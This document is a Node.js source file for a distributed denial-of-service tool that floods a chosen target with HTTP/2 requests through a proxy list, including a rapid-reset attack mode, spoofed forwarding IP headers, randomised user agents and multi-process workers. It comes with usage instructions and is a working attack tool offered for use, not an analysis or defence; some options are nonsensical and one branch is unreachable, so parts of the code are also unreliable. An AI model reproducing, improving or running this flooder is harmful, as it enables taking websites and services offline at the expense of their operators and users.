/*
npm i user-agents hpack socker
*/
const net = require("net");
const http = require("http");
const http2 = require("http2");
const tls = require("tls");
const fs = require("fs");
const crypto = require("crypto");
const HPACK = require("hpack");
const UserAgent = require('user-agents');
const Socker = require('socker'); 
const cluster = require("cluster");
const os = require("os");

if (process.argv.length < 8) {
    console.log(`
Usage:
    node http.js <target> <time> <rate> <threads> <proxyfile> [--redirect true/false] [--query true/false] [--ratelimit true/false] [--rapid true/false] [--httpX http1.1|http1.2|http2]

Example:
    node http.js https://example.com 60 100 5 proxy.txt --redirect true --query true --ratelimit true --rapid true --httpX http2
`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    redirect: process.argv.includes('--redirect') && process.argv[process.argv.indexOf('--redirect') + 1] === 'true',
    query: process.argv.includes('--query') && process.argv[process.argv.indexOf('--query') + 1] === 'true',
    ratelimit: process.argv.includes('--ratelimit') && process.argv[process.argv.indexOf('--ratelimit') + 1] === 'true',
    rapid: process.argv.includes('--rapid') && process.argv[process.argv.indexOf('--rapid') + 1] === 'true',
    httpX: process.argv.includes('--httpX') ? process.argv[process.argv.indexOf('--httpX') + 1] : 'http2',
};

const proxies = fs.readFileSync(args.proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const parsedTarget = new URL(args.target);
let hpack = new HPACK();

const randomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
};

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

let headers = {
    ":method": "GET",
    ":scheme": "https",
    "user-agent": new UserAgent().random().toString(),
    "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "Referer": parsedTarget.href,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    ":authority": parsedTarget.host,
    "X-Requested-With": "XMLHttpRequest",
    "DNT": "1",
    "Upgrade-Insecure-Requests": "1",
    "TE": "Trailers",
    "X-Real-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "X-Forwarded-Proto": "https",
    "X-Forwarded-Host": parsedTarget.host,
    "Forwarded": `for=${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    "X-Frame-Options": "ALLOW-FROM https://example.com",
    "X-XSS-Protection": "1; mode=block",
    "X-Content-Type-Options": "nosniff",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Connection": "keep-alive",
    "If-Modified-Since": new Date(Date.now() - Math.floor(Math.random() * 1000000)).toUTCString(),
    "If-None-Match": `"${randomString(10)}"`,
};

function encodeHeaders(headers) {
    const encodedHeaders = hpack.encode(headers);
    return encodedHeaders;
}

function rapidResetAttack(client, headers) {
    for (let i = 0; i < args.rate; i++) {
        const request = client.request(encodeHeaders(headers))
            .on("response", (response) => {
                request.close();
                request.destroy();
            })
            .on("error", (err) => {
                console.error(`[+] Request error: ${err.message}`);
                request.destroy();
            });

        setTimeout(() => {
            request.close();
            request.destroy();
        }, 10);
    }
}

function createHttp1Client(proxyOptions, callback) {
    const client = http.request({
        ...proxyOptions,
        method: 'GET',
        headers: headers
    }, (response) => {
        response.on('data', () => {});
        response.on('end', () => {
            client.destroy();
        });
    });

    client.on('error', (err) => {
        console.error(`HTTP/1.x client error: ${err.message}`);
        client.destroy();
    });

    callback(client);
}

function createHttp2Client(tlsConn, connection) {
    return http2.connect(parsedTarget.href, {
        protocol: "https:",
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        },
        maxSessionMemory: 64000,
        maxDeflateDynamicTableSize: 4294967295,
        createConnection: () => tlsConn,
        socket: connection,
    });
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const [proxyHost, proxyPort] = proxyAddr.split(":");
    const proxyOptions = {
        host: proxyHost,
        port: ~~proxyPort,
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

    process.on('uncaughtException', (er) => {
        console.error(`Uncaught exception: ${er.message}`);
    });

    process.on('unhandledRejection', (er) => {
        console.error(`Unhandled rejection: ${er.message}`);
    });

    const netSocket = new NetSocket();
    netSocket.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(`NetSocket error: ${error}`);
            return;
        }

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":"),
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            servername: parsedTarget.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
            sigals: "concu",
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            sessionTimeout: 5000
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60 * 10000);

        if (args.httpX === 'http2' || args.httpX === 'http1.1' || args.httpX === 'http1.2') {
            const client = createHttp2Client(tlsConn, connection);

            client.on("connect", () => {
                const interval = setInterval(() => {
                    if (args.rapid) {
                        rapidResetAttack(client, headers);
                    } else {
                        for (let i = 0; i < args.rate; i++) {
                            const request = client.request(encodeHeaders(headers))
                                .on("response", (response) => {
                                    request.close();
                                    request.destroy();
                                })
                                .on("error", (err) => {
                                    console.error(`HTTP/2 request error: ${err.message}`);
                                    request.destroy();
                                });

                            request.end();
                        }
                    }
                }, Math.floor(Math.random() * 1000));
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
            });

            client.on("error", (err) => {
                console.error(`HTTP/2 client error: ${err.message}`);
                client.destroy();
            });

        } else if (args.httpX === 'http1.1' || args.httpX === 'http1.2') {
            createHttp1Client(proxyOptions, (client) => {
                setInterval(() => {
                    if (args.rapid) {
                        rapidResetAttack(client, headers);
                    } else {
                        for (let i = 0; i < args.rate; i++) {
                            const request = client.request({
                                method: 'GET',
                                headers: headers
                            });

                            request.on('response', (response) => {
                                request.close();
                                request.destroy();
                            })
                            .on('error', (err) => {
                                console.error(`HTTP/1.x request error: ${err.message}`);
                                request.destroy();
                            });

                            request.end();
                        }
                    }
                }, Math.floor(Math.random() * 1000));
            });
        }
    });
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", (chunk) => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", (error) => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

if (cluster.isMaster) {
    console.log(`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┣Target: ${args.target}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}
